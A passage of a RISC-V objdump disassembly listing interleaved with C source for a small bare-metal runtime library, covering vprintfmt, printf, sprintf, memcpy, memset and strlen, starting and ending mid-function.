    80001ff0:	0785                	addi	a5,a5,1
    80001ff2:	f8f43c23          	sd	a5,-104(s0)
      putch(ch, putdat);
    80001ff6:	fa843783          	ld	a5,-88(s0)
    80001ffa:	fa043583          	ld	a1,-96(s0)
    80001ffe:	8526                	mv	a0,s1
    80002000:	9782                	jalr	a5
    while ((ch = *(unsigned char *) fmt) != '%') {
    80002002:	f9843783          	ld	a5,-104(s0)
    80002006:	0007c783          	lbu	a5,0(a5)
    8000200a:	0007849b          	sext.w	s1,a5
    8000200e:	8726                	mv	a4,s1
    80002010:	02500793          	li	a5,37
    80002014:	fcf71ae3          	bne	a4,a5,80001fe8 <vprintfmt+0x1e>
    }
    fmt++;
    80002018:	f9843783          	ld	a5,-104(s0)
    8000201c:	0785                	addi	a5,a5,1
    8000201e:	f8f43c23          	sd	a5,-104(s0)

    // Process a %-escape sequence
    last_fmt = fmt;
    80002022:	f9843783          	ld	a5,-104(s0)
    80002026:	faf43c23          	sd	a5,-72(s0)
    padc = ' ';
    8000202a:	02000793          	li	a5,32
    8000202e:	fcf403a3          	sb	a5,-57(s0)
    width = -1;
    80002032:	57fd                	li	a5,-1
    80002034:	fcf42623          	sw	a5,-52(s0)
    precision = -1;
    80002038:	57fd                	li	a5,-1
    8000203a:	fcf42423          	sw	a5,-56(s0)
    lflag = 0;
    8000203e:	fc042823          	sw	zero,-48(s0)
    altflag = 0;
    80002042:	fa042a23          	sw	zero,-76(s0)
  reswitch:
    switch (ch = *(unsigned char *) fmt++) {
    80002046:	f9843783          	ld	a5,-104(s0)
    8000204a:	00178713          	addi	a4,a5,1
    8000204e:	f8e43c23          	sd	a4,-104(s0)
    80002052:	0007c783          	lbu	a5,0(a5)
    80002056:	0007849b          	sext.w	s1,a5
    8000205a:	fdd4869b          	addiw	a3,s1,-35
    8000205e:	0006871b          	sext.w	a4,a3
    80002062:	05500793          	li	a5,85
    80002066:	28e7ed63          	bltu	a5,a4,80002300 <vprintfmt+0x336>
    8000206a:	02069793          	slli	a5,a3,0x20
    8000206e:	9381                	srli	a5,a5,0x20
    80002070:	00279713          	slli	a4,a5,0x2
    80002074:	00001797          	auipc	a5,0x1
    80002078:	96478793          	addi	a5,a5,-1692 # 800029d8 <atol+0x288>
    8000207c:	97ba                	add	a5,a5,a4
    8000207e:	439c                	lw	a5,0(a5)
    80002080:	0007871b          	sext.w	a4,a5
    80002084:	00001797          	auipc	a5,0x1
    80002088:	95478793          	addi	a5,a5,-1708 # 800029d8 <atol+0x288>
    8000208c:	97ba                	add	a5,a5,a4
    8000208e:	8782                	jr	a5

    // flag to pad on the right
    case '-':
      padc = '-';
    80002090:	02d00793          	li	a5,45
    80002094:	fcf403a3          	sb	a5,-57(s0)
      goto reswitch;
    80002098:	b77d                	j	80002046 <vprintfmt+0x7c>
      
    // flag to pad with 0's instead of spaces
    case '0':
      padc = '0';
    8000209a:	03000793          	li	a5,48
    8000209e:	fcf403a3          	sb	a5,-57(s0)
      goto reswitch;
    800020a2:	b755                	j	80002046 <vprintfmt+0x7c>
    case '5':
    case '6':
    case '7':
    case '8':
    case '9':
      for (precision = 0; ; ++fmt) {
    800020a4:	fc042423          	sw	zero,-56(s0)
        precision = precision * 10 + ch - '0';
    800020a8:	fc842703          	lw	a4,-56(s0)
    800020ac:	87ba                	mv	a5,a4
    800020ae:	0027979b          	slliw	a5,a5,0x2
    800020b2:	9fb9                	addw	a5,a5,a4
    800020b4:	0017979b          	slliw	a5,a5,0x1
    800020b8:	2781                	sext.w	a5,a5
    800020ba:	9fa5                	addw	a5,a5,s1
    800020bc:	2781                	sext.w	a5,a5
    800020be:	fd07879b          	addiw	a5,a5,-48
    800020c2:	fcf42423          	sw	a5,-56(s0)
        ch = *fmt;
    800020c6:	f9843783          	ld	a5,-104(s0)
    800020ca:	0007c783          	lbu	a5,0(a5)
    800020ce:	0007849b          	sext.w	s1,a5
        if (ch < '0' || ch > '9')
    800020d2:	8726                	mv	a4,s1
    800020d4:	02f00793          	li	a5,47
    800020d8:	04e7d363          	ble	a4,a5,8000211e <vprintfmt+0x154>
    800020dc:	8726                	mv	a4,s1
    800020de:	03900793          	li	a5,57
    800020e2:	02e7ce63          	blt	a5,a4,8000211e <vprintfmt+0x154>
      for (precision = 0; ; ++fmt) {
    800020e6:	f9843783          	ld	a5,-104(s0)
    800020ea:	0785                	addi	a5,a5,1
    800020ec:	f8f43c23          	sd	a5,-104(s0)
        precision = precision * 10 + ch - '0';
    800020f0:	bf65                	j	800020a8 <vprintfmt+0xde>
          break;
      }
      goto process_precision;

    case '*':
      precision = va_arg(ap, int);
    800020f2:	f9043783          	ld	a5,-112(s0)
    800020f6:	00878713          	addi	a4,a5,8
    800020fa:	f8e43823          	sd	a4,-112(s0)
    800020fe:	439c                	lw	a5,0(a5)
    80002100:	fcf42423          	sw	a5,-56(s0)
      goto process_precision;
    80002104:	a831                	j	80002120 <vprintfmt+0x156>

    case '.':
      if (width < 0)
    80002106:	fcc42783          	lw	a5,-52(s0)
    8000210a:	2781                	sext.w	a5,a5
    8000210c:	f207dde3          	bgez	a5,80002046 <vprintfmt+0x7c>
        width = 0;
    80002110:	fc042623          	sw	zero,-52(s0)
      goto reswitch;
    80002114:	bf0d                	j	80002046 <vprintfmt+0x7c>

    case '#':
      altflag = 1;
    80002116:	4785                	li	a5,1
    80002118:	faf42a23          	sw	a5,-76(s0)
      goto reswitch;
    8000211c:	b72d                	j	80002046 <vprintfmt+0x7c>
      goto process_precision;
    8000211e:	0001                	nop

    process_precision:
      if (width < 0)
    80002120:	fcc42783          	lw	a5,-52(s0)
    80002124:	2781                	sext.w	a5,a5
    80002126:	f207d0e3          	bgez	a5,80002046 <vprintfmt+0x7c>
        width = precision, precision = -1;
    8000212a:	fc842783          	lw	a5,-56(s0)
    8000212e:	fcf42623          	sw	a5,-52(s0)
    80002132:	57fd                	li	a5,-1
    80002134:	fcf42423          	sw	a5,-56(s0)
      goto reswitch;
    80002138:	b739                	j	80002046 <vprintfmt+0x7c>

    // long flag (doubled for long long)
    case 'l':
      lflag++;
    8000213a:	fd042783          	lw	a5,-48(s0)
    8000213e:	2785                	addiw	a5,a5,1
    80002140:	fcf42823          	sw	a5,-48(s0)
      goto reswitch;
    80002144:	b709                	j	80002046 <vprintfmt+0x7c>

    // character
    case 'c':
      putch(va_arg(ap, int), putdat);
    80002146:	f9043783          	ld	a5,-112(s0)
    8000214a:	00878713          	addi	a4,a5,8
    8000214e:	f8e43823          	sd	a4,-112(s0)
    80002152:	439c                	lw	a5,0(a5)
    80002154:	fa843703          	ld	a4,-88(s0)
    80002158:	fa043583          	ld	a1,-96(s0)
    8000215c:	853e                	mv	a0,a5
    8000215e:	9702                	jalr	a4
      break;
    80002160:	aa65                	j	80002318 <vprintfmt+0x34e>

    // string
    case 's':
      if ((p = va_arg(ap, char *)) == NULL)
    80002162:	f9043783          	ld	a5,-112(s0)
    80002166:	00878713          	addi	a4,a5,8
    8000216a:	f8e43823          	sd	a4,-112(s0)
    8000216e:	0007b903          	ld	s2,0(a5)
    80002172:	00091663          	bnez	s2,8000217e <vprintfmt+0x1b4>
        p = "(null)";
    80002176:	00001917          	auipc	s2,0x1
    8000217a:	85a90913          	addi	s2,s2,-1958 # 800029d0 <atol+0x280>
      if (width > 0 && padc != '-')
    8000217e:	fcc42783          	lw	a5,-52(s0)
    80002182:	2781                	sext.w	a5,a5
    80002184:	06f05a63          	blez	a5,800021f8 <vprintfmt+0x22e>
    80002188:	fc744783          	lbu	a5,-57(s0)
    8000218c:	0ff7f713          	andi	a4,a5,255
    80002190:	02d00793          	li	a5,45
    80002194:	06f70263          	beq	a4,a5,800021f8 <vprintfmt+0x22e>
        for (width -= strnlen(p, precision); width > 0; width--)
    80002198:	fcc42483          	lw	s1,-52(s0)
    8000219c:	fc842783          	lw	a5,-56(s0)
    800021a0:	85be                	mv	a1,a5
    800021a2:	854a                	mv	a0,s2
    800021a4:	4a4000ef          	jal	ra,80002648 <strnlen>
    800021a8:	87aa                	mv	a5,a0
    800021aa:	2781                	sext.w	a5,a5
    800021ac:	40f487bb          	subw	a5,s1,a5
    800021b0:	2781                	sext.w	a5,a5
    800021b2:	fcf42623          	sw	a5,-52(s0)
    800021b6:	a839                	j	800021d4 <vprintfmt+0x20a>
          putch(padc, putdat);
    800021b8:	fc744783          	lbu	a5,-57(s0)
    800021bc:	2781                	sext.w	a5,a5
    800021be:	fa843703          	ld	a4,-88(s0)
    800021c2:	fa043583          	ld	a1,-96(s0)
    800021c6:	853e                	mv	a0,a5
    800021c8:	9702                	jalr	a4
        for (width -= strnlen(p, precision); width > 0; width--)
    800021ca:	fcc42783          	lw	a5,-52(s0)
    800021ce:	37fd                	addiw	a5,a5,-1
    800021d0:	fcf42623          	sw	a5,-52(s0)
    800021d4:	fcc42783          	lw	a5,-52(s0)
    800021d8:	2781                	sext.w	a5,a5
    800021da:	fcf04fe3          	bgtz	a5,800021b8 <vprintfmt+0x1ee>
      for (; (ch = *p) != '\0' && (precision < 0 || --precision >= 0); width--) {
    800021de:	a829                	j	800021f8 <vprintfmt+0x22e>
        putch(ch, putdat);
    800021e0:	fa843783          	ld	a5,-88(s0)
    800021e4:	fa043583          	ld	a1,-96(s0)
    800021e8:	8526                	mv	a0,s1
    800021ea:	9782                	jalr	a5
        p++;
    800021ec:	0905                	addi	s2,s2,1
      for (; (ch = *p) != '\0' && (precision < 0 || --precision >= 0); width--) {
    800021ee:	fcc42783          	lw	a5,-52(s0)
    800021f2:	37fd                	addiw	a5,a5,-1
    800021f4:	fcf42623          	sw	a5,-52(s0)
    800021f8:	00094783          	lbu	a5,0(s2)
    800021fc:	0007849b          	sext.w	s1,a5
    80002200:	cc8d                	beqz	s1,8000223a <vprintfmt+0x270>
    80002202:	fc842783          	lw	a5,-56(s0)
    80002206:	2781                	sext.w	a5,a5
    80002208:	fc07cce3          	bltz	a5,800021e0 <vprintfmt+0x216>
    8000220c:	fc842783          	lw	a5,-56(s0)
    80002210:	37fd                	addiw	a5,a5,-1
    80002212:	fcf42423          	sw	a5,-56(s0)
    80002216:	fc842783          	lw	a5,-56(s0)
    8000221a:	2781                	sext.w	a5,a5
    8000221c:	fc07d2e3          	bgez	a5,800021e0 <vprintfmt+0x216>
      }
      for (; width > 0; width--)
    80002220:	a829                	j	8000223a <vprintfmt+0x270>
        putch(' ', putdat);
    80002222:	fa843783          	ld	a5,-88(s0)
    80002226:	fa043583          	ld	a1,-96(s0)
    8000222a:	02000513          	li	a0,32
    8000222e:	9782                	jalr	a5
      for (; width > 0; width--)
    80002230:	fcc42783          	lw	a5,-52(s0)
    80002234:	37fd                	addiw	a5,a5,-1
    80002236:	fcf42623          	sw	a5,-52(s0)
    8000223a:	fcc42783          	lw	a5,-52(s0)
    8000223e:	2781                	sext.w	a5,a5
    80002240:	fef041e3          	bgtz	a5,80002222 <vprintfmt+0x258>
      break;
    80002244:	a8d1                	j	80002318 <vprintfmt+0x34e>

    // (signed) decimal
    case 'd':
      num = getint(&ap, lflag);
    80002246:	fd042703          	lw	a4,-48(s0)
    8000224a:	f9040793          	addi	a5,s0,-112
    8000224e:	85ba                	mv	a1,a4
    80002250:	853e                	mv	a0,a5
    80002252:	d11ff0ef          	jal	ra,80001f62 <getint>
    80002256:	87aa                	mv	a5,a0
    80002258:	fcf43c23          	sd	a5,-40(s0)
      if ((long long) num < 0) {
    8000225c:	fd843783          	ld	a5,-40(s0)
    80002260:	0007df63          	bgez	a5,8000227e <vprintfmt+0x2b4>
        putch('-', putdat);
    80002264:	fa843783          	ld	a5,-88(s0)
    80002268:	fa043583          	ld	a1,-96(s0)
    8000226c:	02d00513          	li	a0,45
    80002270:	9782                	jalr	a5
        num = -(long long) num;
    80002272:	fd843783          	ld	a5,-40(s0)
    80002276:	40f007b3          	neg	a5,a5
    8000227a:	fcf43c23          	sd	a5,-40(s0)
      }
      base = 10;
    8000227e:	47a9                	li	a5,10
    80002280:	fcf42a23          	sw	a5,-44(s0)
      goto signed_number;
    80002284:	a0b9                	j	800022d2 <vprintfmt+0x308>

    // unsigned decimal
    case 'u':
      base = 10;
    80002286:	47a9                	li	a5,10
    80002288:	fcf42a23          	sw	a5,-44(s0)
      goto unsigned_number;
    8000228c:	a80d                	j	800022be <vprintfmt+0x2f4>

    // (unsigned) octal
    case 'o':
      // should do something with padding so it's always 3 octits
      base = 8;
    8000228e:	47a1                	li	a5,8
    80002290:	fcf42a23          	sw	a5,-44(s0)
      goto unsigned_number;
    80002294:	a02d                	j	800022be <vprintfmt+0x2f4>

    // pointer
    case 'p':
      static_assert(sizeof(long) == sizeof(void*));
      lflag = 1;
    80002296:	4785                	li	a5,1
    80002298:	fcf42823          	sw	a5,-48(s0)
      putch('0', putdat);
    8000229c:	fa843783          	ld	a5,-88(s0)
    800022a0:	fa043583          	ld	a1,-96(s0)
    800022a4:	03000513          	li	a0,48
    800022a8:	9782                	jalr	a5
      putch('x', putdat);
    800022aa:	fa843783          	ld	a5,-88(s0)
    800022ae:	fa043583          	ld	a1,-96(s0)
    800022b2:	07800513          	li	a0,120
    800022b6:	9782                	jalr	a5
      /* fall through to 'x' */

    // (unsigned) hexadecimal
    case 'x':
      base = 16;
    800022b8:	47c1                	li	a5,16
    800022ba:	fcf42a23          	sw	a5,-44(s0)
    unsigned_number:
      num = getuint(&ap, lflag);
    800022be:	fd042703          	lw	a4,-48(s0)
    800022c2:	f9040793          	addi	a5,s0,-112
    800022c6:	85ba                	mv	a1,a4
    800022c8:	853e                	mv	a0,a5
    800022ca:	c2dff0ef          	jal	ra,80001ef6 <getuint>
    800022ce:	fca43c23          	sd	a0,-40(s0)
    signed_number:
      printnum(putch, putdat, num, base, width, padc);
    800022d2:	fd442683          	lw	a3,-44(s0)
    800022d6:	fc744783          	lbu	a5,-57(s0)
    800022da:	2781                	sext.w	a5,a5
    800022dc:	fcc42703          	lw	a4,-52(s0)
    800022e0:	fd843603          	ld	a2,-40(s0)
    800022e4:	fa043583          	ld	a1,-96(s0)
    800022e8:	fa843503          	ld	a0,-88(s0)
    800022ec:	b09ff0ef          	jal	ra,80001df4 <printnum>
      break;
    800022f0:	a025                	j	80002318 <vprintfmt+0x34e>

    // escaped '%' character
    case '%':
      putch(ch, putdat);
    800022f2:	fa843783          	ld	a5,-88(s0)
    800022f6:	fa043583          	ld	a1,-96(s0)
    800022fa:	8526                	mv	a0,s1
    800022fc:	9782                	jalr	a5
      break;
    800022fe:	a829                	j	80002318 <vprintfmt+0x34e>
      
    // unrecognized escape sequence - just print it literally
    default:
      putch('%', putdat);
    80002300:	fa843783          	ld	a5,-88(s0)
    80002304:	fa043583          	ld	a1,-96(s0)
    80002308:	02500513          	li	a0,37
    8000230c:	9782                	jalr	a5
      fmt = last_fmt;
    8000230e:	fb843783          	ld	a5,-72(s0)
    80002312:	f8f43c23          	sd	a5,-104(s0)
      break;
    80002316:	0001                	nop
    while ((ch = *(unsigned char *) fmt) != '%') {
    80002318:	b1ed                	j	80002002 <vprintfmt+0x38>
        return;
    8000231a:	0001                	nop
    }
  }
}
    8000231c:	70a6                	ld	ra,104(sp)
    8000231e:	7406                	ld	s0,96(sp)
    80002320:	64e6                	ld	s1,88(sp)
    80002322:	6946                	ld	s2,80(sp)
    80002324:	6165                	addi	sp,sp,112
    80002326:	8082                	ret

0000000080002328 <printf>:

int printf(const char* fmt, ...)
{
    80002328:	7159                	addi	sp,sp,-112
    8000232a:	f406                	sd	ra,40(sp)
    8000232c:	f022                	sd	s0,32(sp)
    8000232e:	1800                	addi	s0,sp,48
    80002330:	fca43c23          	sd	a0,-40(s0)
    80002334:	e40c                	sd	a1,8(s0)
    80002336:	e810                	sd	a2,16(s0)
    80002338:	ec14                	sd	a3,24(s0)
    8000233a:	f018                	sd	a4,32(s0)
    8000233c:	f41c                	sd	a5,40(s0)
    8000233e:	03043823          	sd	a6,48(s0)
    80002342:	03143c23          	sd	a7,56(s0)
  va_list ap;
  va_start(ap, fmt);
    80002346:	04040793          	addi	a5,s0,64
    8000234a:	fcf43823          	sd	a5,-48(s0)
    8000234e:	fd043783          	ld	a5,-48(s0)
    80002352:	fc878793          	addi	a5,a5,-56
    80002356:	fef43423          	sd	a5,-24(s0)

  vprintfmt((void*)putchar, 0, fmt, ap);
    8000235a:	fe843783          	ld	a5,-24(s0)
    8000235e:	86be                	mv	a3,a5
    80002360:	fd843603          	ld	a2,-40(s0)
    80002364:	4581                	li	a1,0
    80002366:	00000517          	auipc	a0,0x0
    8000236a:	98e50513          	addi	a0,a0,-1650 # 80001cf4 <putchar>
    8000236e:	c5dff0ef          	jal	ra,80001fca <vprintfmt>

  va_end(ap);
  return 0; // incorrect return value, but who cares, anyway?
    80002372:	4781                	li	a5,0
}
    80002374:	853e                	mv	a0,a5
    80002376:	70a2                	ld	ra,40(sp)
    80002378:	7402                	ld	s0,32(sp)
    8000237a:	6165                	addi	sp,sp,112
    8000237c:	8082                	ret

000000008000237e <sprintf_putch.3105>:
  va_list ap;
  char* str0 = str;
  va_start(ap, fmt);

  void sprintf_putch(int ch, void** data)
  {
    8000237e:	7139                	addi	sp,sp,-64
    80002380:	fc22                	sd	s0,56(sp)
    80002382:	0080                	addi	s0,sp,64
    80002384:	87aa                	mv	a5,a0
    80002386:	fcb43823          	sd	a1,-48(s0)
    8000238a:	fcf42e23          	sw	a5,-36(s0)
    8000238e:	fc743423          	sd	t2,-56(s0)
    char** pstr = (char**)data;
    80002392:	fd043783          	ld	a5,-48(s0)
    80002396:	fef43423          	sd	a5,-24(s0)
    **pstr = ch;
    8000239a:	fe843783          	ld	a5,-24(s0)
    8000239e:	639c                	ld	a5,0(a5)
    800023a0:	fdc42703          	lw	a4,-36(s0)
    800023a4:	0ff77713          	andi	a4,a4,255
    800023a8:	00e78023          	sb	a4,0(a5)
    (*pstr)++;
    800023ac:	fe843783          	ld	a5,-24(s0)
    800023b0:	639c                	ld	a5,0(a5)
    800023b2:	00178713          	addi	a4,a5,1
    800023b6:	fe843783          	ld	a5,-24(s0)
    800023ba:	e398                	sd	a4,0(a5)
  }
    800023bc:	0001                	nop
    800023be:	7462                	ld	s0,56(sp)
    800023c0:	6121                	addi	sp,sp,64
    800023c2:	8082                	ret

00000000800023c4 <sprintf>:
{
    800023c4:	716d                	addi	sp,sp,-272
    800023c6:	ed86                	sd	ra,216(sp)
    800023c8:	e9a2                	sd	s0,208(sp)
    800023ca:	1180                	addi	s0,sp,224
    800023cc:	f2a43c23          	sd	a0,-200(s0)
    800023d0:	f2b43823          	sd	a1,-208(s0)
    800023d4:	e010                	sd	a2,0(s0)
    800023d6:	e414                	sd	a3,8(s0)
    800023d8:	e818                	sd	a4,16(s0)
    800023da:	ec1c                	sd	a5,24(s0)
    800023dc:	03043023          	sd	a6,32(s0)
    800023e0:	03143423          	sd	a7,40(s0)
int	feof (FILE *);
int	ferror (FILE *);
void    perror (const char *);
#ifndef _REENT_ONLY
FILE *	fopen (const char *__restrict _name, const char *__restrict _type);
int	sprintf (char *__restrict, const char *__restrict, ...)
    800023e4:	03040793          	addi	a5,s0,48
    800023e8:	f2f43423          	sd	a5,-216(s0)
    800023ec:	f2843783          	ld	a5,-216(s0)
    800023f0:	fcf43c23          	sd	a5,-40(s0)
    800023f4:	f4840793          	addi	a5,s0,-184
    800023f8:	f4840713          	addi	a4,s0,-184
    800023fc:	39700693          	li	a3,919
    80002400:	c394                	sw	a3,0(a5)
    80002402:	0183b6b7          	lui	a3,0x183b
    80002406:	30368693          	addi	a3,a3,771 # 183b303 <_tbss_end+0x183b27f>
    8000240a:	c3d4                	sw	a3,4(a5)
    8000240c:	0103b6b7          	lui	a3,0x103b
    80002410:	38368693          	addi	a3,a3,899 # 103b383 <_tbss_end+0x103b2ff>
    80002414:	c794                	sw	a3,8(a5)
    80002416:	000306b7          	lui	a3,0x30
    8000241a:	06768693          	addi	a3,a3,103 # 30067 <_tbss_end+0x2ffe3>
    8000241e:	c7d4                	sw	a3,12(a5)
    80002420:	eb98                	sd	a4,16(a5)
    80002422:	00000717          	auipc	a4,0x0
    80002426:	f5c70713          	addi	a4,a4,-164 # 8000237e <sprintf_putch.3105>
    8000242a:	ef98                	sd	a4,24(a5)
    8000242c:	0000100f          	fence.i
  char* str0 = str;
    80002430:	f3843783          	ld	a5,-200(s0)
    80002434:	fef43423          	sd	a5,-24(s0)
  va_start(ap, fmt);
    80002438:	03040793          	addi	a5,s0,48
    8000243c:	f2f43423          	sd	a5,-216(s0)
    80002440:	f2843783          	ld	a5,-216(s0)
    80002444:	fd078793          	addi	a5,a5,-48
    80002448:	fef43023          	sd	a5,-32(s0)

  vprintfmt(sprintf_putch, (void**)&str, fmt, ap);
    8000244c:	fe043703          	ld	a4,-32(s0)
    80002450:	f4840793          	addi	a5,s0,-184
    80002454:	853e                	mv	a0,a5
    80002456:	f3840793          	addi	a5,s0,-200
    8000245a:	86ba                	mv	a3,a4
    8000245c:	f3043603          	ld	a2,-208(s0)
    80002460:	85be                	mv	a1,a5
    80002462:	b69ff0ef          	jal	ra,80001fca <vprintfmt>
  *str = 0;
    80002466:	f3843783          	ld	a5,-200(s0)
    8000246a:	00078023          	sb	zero,0(a5)

  va_end(ap);
  return str - str0;
    8000246e:	f3843703          	ld	a4,-200(s0)
    80002472:	fe843783          	ld	a5,-24(s0)
    80002476:	40f707b3          	sub	a5,a4,a5
    8000247a:	2781                	sext.w	a5,a5
}
    8000247c:	853e                	mv	a0,a5
    8000247e:	60ee                	ld	ra,216(sp)
    80002480:	644e                	ld	s0,208(sp)
    80002482:	6151                	addi	sp,sp,272
    80002484:	8082                	ret

0000000080002486 <memcpy>:

void* memcpy(void* dest, const void* src, size_t len)
{
    80002486:	715d                	addi	sp,sp,-80
    80002488:	e4a2                	sd	s0,72(sp)
    8000248a:	0880                	addi	s0,sp,80
    8000248c:	fca43423          	sd	a0,-56(s0)
    80002490:	fcb43023          	sd	a1,-64(s0)
    80002494:	fac43c23          	sd	a2,-72(s0)
  if ((((uintptr_t)dest | (uintptr_t)src | len) & (sizeof(uintptr_t)-1)) == 0) {
    80002498:	fc843703          	ld	a4,-56(s0)
    8000249c:	fc043783          	ld	a5,-64(s0)
    800024a0:	8f5d                	or	a4,a4,a5
    800024a2:	fb843783          	ld	a5,-72(s0)
    800024a6:	8fd9                	or	a5,a5,a4
    800024a8:	8b9d                	andi	a5,a5,7
    800024aa:	e3b1                	bnez	a5,800024ee <memcpy+0x68>
    const uintptr_t* s = src;
    800024ac:	fc043783          	ld	a5,-64(s0)
    800024b0:	fef43423          	sd	a5,-24(s0)
    uintptr_t *d = dest;
    800024b4:	fc843783          	ld	a5,-56(s0)
    800024b8:	fef43023          	sd	a5,-32(s0)
    while (d < (uintptr_t*)(dest + len))
    800024bc:	a839                	j	800024da <memcpy+0x54>
      *d++ = *s++;
    800024be:	fe843703          	ld	a4,-24(s0)
    800024c2:	00870793          	addi	a5,a4,8
    800024c6:	fef43423          	sd	a5,-24(s0)
    800024ca:	fe043783          	ld	a5,-32(s0)
    800024ce:	00878693          	addi	a3,a5,8
    800024d2:	fed43023          	sd	a3,-32(s0)
    800024d6:	6318                	ld	a4,0(a4)
    800024d8:	e398                	sd	a4,0(a5)
    while (d < (uintptr_t*)(dest + len))
    800024da:	fc843703          	ld	a4,-56(s0)
    800024de:	fb843783          	ld	a5,-72(s0)
    800024e2:	97ba                	add	a5,a5,a4
    800024e4:	fe043703          	ld	a4,-32(s0)
    800024e8:	fcf76be3          	bltu	a4,a5,800024be <memcpy+0x38>
    800024ec:	a099                	j	80002532 <memcpy+0xac>
  } else {
    const char* s = src;
    800024ee:	fc043783          	ld	a5,-64(s0)
    800024f2:	fcf43c23          	sd	a5,-40(s0)
    char *d = dest;
    800024f6:	fc843783          	ld	a5,-56(s0)
    800024fa:	fcf43823          	sd	a5,-48(s0)
    while (d < (char*)(dest + len))
    800024fe:	a00d                	j	80002520 <memcpy+0x9a>
      *d++ = *s++;
    80002500:	fd843703          	ld	a4,-40(s0)
    80002504:	00170793          	addi	a5,a4,1
    80002508:	fcf43c23          	sd	a5,-40(s0)
    8000250c:	fd043783          	ld	a5,-48(s0)
    80002510:	00178693          	addi	a3,a5,1
    80002514:	fcd43823          	sd	a3,-48(s0)
    80002518:	00074703          	lbu	a4,0(a4)
    8000251c:	00e78023          	sb	a4,0(a5)
    while (d < (char*)(dest + len))
    80002520:	fc843703          	ld	a4,-56(s0)
    80002524:	fb843783          	ld	a5,-72(s0)
    80002528:	97ba                	add	a5,a5,a4
    8000252a:	fd043703          	ld	a4,-48(s0)
    8000252e:	fcf769e3          	bltu	a4,a5,80002500 <memcpy+0x7a>
  }
  return dest;
    80002532:	fc843783          	ld	a5,-56(s0)
}
    80002536:	853e                	mv	a0,a5
    80002538:	6426                	ld	s0,72(sp)
    8000253a:	6161                	addi	sp,sp,80
    8000253c:	8082                	ret

000000008000253e <memset>:

void* memset(void* dest, int byte, size_t len)
{
    8000253e:	715d                	addi	sp,sp,-80
    80002540:	e4a2                	sd	s0,72(sp)
    80002542:	0880                	addi	s0,sp,80
    80002544:	fca43423          	sd	a0,-56(s0)
    80002548:	87ae                	mv	a5,a1
    8000254a:	fac43c23          	sd	a2,-72(s0)
    8000254e:	fcf42223          	sw	a5,-60(s0)
  if ((((uintptr_t)dest | len) & (sizeof(uintptr_t)-1)) == 0) {
    80002552:	fc843703          	ld	a4,-56(s0)
    80002556:	fb843783          	ld	a5,-72(s0)
    8000255a:	8fd9                	or	a5,a5,a4
    8000255c:	8b9d                	andi	a5,a5,7
    8000255e:	e7bd                	bnez	a5,800025cc <memset+0x8e>
    uintptr_t word = byte & 0xFF;
    80002560:	fc442783          	lw	a5,-60(s0)
    80002564:	0ff7f793          	andi	a5,a5,255
    80002568:	fcf43c23          	sd	a5,-40(s0)
    word |= word << 8;
    8000256c:	fd843783          	ld	a5,-40(s0)
    80002570:	07a2                	slli	a5,a5,0x8
    80002572:	fd843703          	ld	a4,-40(s0)
    80002576:	8fd9                	or	a5,a5,a4
    80002578:	fcf43c23          	sd	a5,-40(s0)
    word |= word << 16;
    8000257c:	fd843783          	ld	a5,-40(s0)
    80002580:	07c2                	slli	a5,a5,0x10
    80002582:	fd843703          	ld	a4,-40(s0)
    80002586:	8fd9                	or	a5,a5,a4
    80002588:	fcf43c23          	sd	a5,-40(s0)
    word |= word << 16 << 16;
    8000258c:	fd843783          	ld	a5,-40(s0)
    80002590:	1782                	slli	a5,a5,0x20
    80002592:	fd843703          	ld	a4,-40(s0)
    80002596:	8fd9                	or	a5,a5,a4
    80002598:	fcf43c23          	sd	a5,-40(s0)

    uintptr_t *d = dest;
    8000259c:	fc843783          	ld	a5,-56(s0)
    800025a0:	fef43423          	sd	a5,-24(s0)
    while (d < (uintptr_t*)(dest + len))
    800025a4:	a811                	j	800025b8 <memset+0x7a>
      *d++ = word;
    800025a6:	fe843783          	ld	a5,-24(s0)
    800025aa:	00878713          	addi	a4,a5,8
    800025ae:	fee43423          	sd	a4,-24(s0)
    800025b2:	fd843703          	ld	a4,-40(s0)
    800025b6:	e398                	sd	a4,0(a5)
    while (d < (uintptr_t*)(dest + len))
    800025b8:	fc843703          	ld	a4,-56(s0)
    800025bc:	fb843783          	ld	a5,-72(s0)
    800025c0:	97ba                	add	a5,a5,a4
    800025c2:	fe843703          	ld	a4,-24(s0)
    800025c6:	fef760e3          	bltu	a4,a5,800025a6 <memset+0x68>
    800025ca:	a81d                	j	80002600 <memset+0xc2>
  } else {
    char *d = dest;
    800025cc:	fc843783          	ld	a5,-56(s0)
    800025d0:	fef43023          	sd	a5,-32(s0)
    while (d < (char*)(dest + len))
    800025d4:	a829                	j	800025ee <memset+0xb0>
      *d++ = byte;
    800025d6:	fe043783          	ld	a5,-32(s0)
    800025da:	00178713          	addi	a4,a5,1
    800025de:	fee43023          	sd	a4,-32(s0)
    800025e2:	fc442703          	lw	a4,-60(s0)
    800025e6:	0ff77713          	andi	a4,a4,255
    800025ea:	00e78023          	sb	a4,0(a5)
    while (d < (char*)(dest + len))
    800025ee:	fc843703          	ld	a4,-56(s0)
    800025f2:	fb843783          	ld	a5,-72(s0)
    800025f6:	97ba                	add	a5,a5,a4
    800025f8:	fe043703          	ld	a4,-32(s0)
    800025fc:	fcf76de3          	bltu	a4,a5,800025d6 <memset+0x98>
  }
  return dest;
    80002600:	fc843783          	ld	a5,-56(s0)
}
    80002604:	853e                	mv	a0,a5
    80002606:	6426                	ld	s0,72(sp)
    80002608:	6161                	addi	sp,sp,80
    8000260a:	8082                	ret

000000008000260c <strlen>:

size_t strlen(const char *s)
{
    8000260c:	7179                	addi	sp,sp,-48
    8000260e:	f422                	sd	s0,40(sp)
    80002610:	1800                	addi	s0,sp,48
    80002612:	fca43c23          	sd	a0,-40(s0)
  const char *p = s;
    80002616:	fd843783          	ld	a5,-40(s0)
    8000261a:	fef43423          	sd	a5,-24(s0)
  while (*p)
    8000261e:	a031                	j	8000262a <strlen+0x1e>
    p++;
    80002620:	fe843783          	ld	a5,-24(s0)
    80002624:	0785                	addi	a5,a5,1
    80002626:	fef43423          	sd	a5,-24(s0)
  while (*p)
    8000262a:	fe843783          	ld	a5,-24(s0)
    8000262e:	0007c783          	lbu	a5,0(a5)
    80002632:	f7fd                	bnez	a5,80002620 <strlen+0x14>
  return p - s;
    80002634:	fe843703          	ld	a4,-24(s0)
    80002638:	fd843783          	ld	a5,-40(s0)
    8000263c:	40f707b3          	sub	a5,a4,a5
}
    80002640:	853e                	mv	a0,a5
    80002642:	7422                	ld	s0,40(sp)
    80002644:	6145                	addi	sp,sp,48
    80002646:	8082                	ret

0000000080002648 <strnlen>:

size_t strnlen(const char *s, size_t n)
{
    80002648:	7179                	addi	sp,sp,-48
